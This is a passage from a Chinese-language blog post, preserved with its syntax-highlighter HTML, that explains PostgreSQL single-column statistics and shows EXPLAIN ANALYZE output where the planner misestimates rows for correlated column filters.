class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-13\"><span class=\"crayon-i\">schemaname</span>             <span class=\"crayon-o\">|</span> <span class=\"crayon-m\">public</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-14\"><span class=\"crayon-i\">tablename</span>              <span class=\"crayon-o\">|</span> <span class=\"crayon-e\">tbl</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-15\"><span class=\"crayon-i\">attname</span>                <span class=\"crayon-o\">|</span> <span class=\"crayon-e\">col1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-16\"><span class=\"crayon-i\">inherited</span>              <span class=\"crayon-o\">|</span> <span class=\"crayon-i\">f</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-17\"><span class=\"crayon-v\">null</span><span class=\"crayon-sy\">_</span>frac              <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-18\"><span class=\"crayon-v\">avg</span><span class=\"crayon-sy\">_</span>width              <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">4</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-19\"><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">_</span>distinct             <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">1000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-20\"><span class=\"crayon-v\">most_common</span><span class=\"crayon-sy\">_</span>vals       <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">318</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">564</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">596</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-21\"><span class=\"crayon-v\">most_common</span><span class=\"crayon-sy\">_</span>freqs      <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">0.00173333</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.0017</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.00166667</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.00156667</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-22\"><span class=\"crayon-v\">histogram</span><span class=\"crayon-sy\">_</span>bounds       <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">39</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-23\"><span class=\"crayon-i\">correlation</span>            <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-24\"><span class=\"crayon-v\">most_common</span><span class=\"crayon-sy\">_</span>elems      <span class=\"crayon-o\">|</span> </div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-25\"><span class=\"crayon-v\">most_common_elem</span><span class=\"crayon-sy\">_</span>freqs <span class=\"crayon-o\">|</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-26\"><span class=\"crayon-v\">elem_count</span><span class=\"crayon-sy\">_</span>histogram   <span class=\"crayon-o\">|</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0151 seconds] -->\r\n<p><strong>单列统计数据不足时</strong></p>\n<p>这些单列统计信息可帮助 planner 估算你的条件选择性（这是 planner 用来估算<a href=\"https://www.postgresql.org/docs/10/static/row-estimation-examples.html\" rel=\"nofollow\">索引扫描</a>将选择多少行的内容）。 当查询中存在多个条件时，planner 假定列（或 where 子句条件）彼此独立。 当列相互关联或相互依赖并导致 planner 低估或高估这些条件将返回的行数时，就不适用。</p>\n<p>我们来看下面的几个例子。 为了使查询计划易于阅读，我们通过设置 max_parallel_workers_per_gather  为 0 来关闭每个查询的并行性：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae34583363287411\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1;                            \r\n                                                QUERY PLAN                                                 \r\n-----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..169247.80 rows=9584 width=8) (actual time=0.641..622.851 rows=10000 loops=1)\r\n   Filter: (col1 = 1)\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.051 ms\r\n Execution time: 623.185 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae34583363287411-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34583363287411-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34583363287411-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34583363287411-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34583363287411-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34583363287411-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34583363287411-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34583363287411-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34583363287411-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae34583363287411-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span>                            </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34583363287411-2\">                                                <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                 </div><div class=\"crayon-line\" id=\"crayon-5b625fae34583363287411-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34583363287411-4\"> <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..169247.80</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9584</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.641..622.851</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34583363287411-5\">   <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34583363287411-6\">   <span class=\"crayon-i\">Rows</span> <span class=\"crayon-i\">Removed</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">9990000</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34583363287411-7\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.051</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34583363287411-8\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">623.185</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae34583363287411-9\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0036 seconds] -->\r\n<p>正如你看到的那样，planner 估计 col1 的值为 1 的行数是 9584 ，而查询返回的实际行数是 10000 ，所以相当准确。</p>\n<p>当你在 column 1 和 column 2 都包含过滤器时会发生什么情况。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae3458b793195282\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1 and col2 = 0;                            \r\n                                                QUERY PLAN                                                \r\n----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..194248.69 rows=100 width=8) (actual time=0.640..630.130 rows=10000 loops=1)\r\n   Filter: ((col1 = 1) AND (col2 = 0))\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.072 ms\r\n Execution time: 630.467 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae3458b793195282-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3458b793195282-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3458b793195282-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3458b793195282-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3458b793195282-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3458b793195282-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3458b793195282-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae3458b793195282-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae3458b793195282-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; 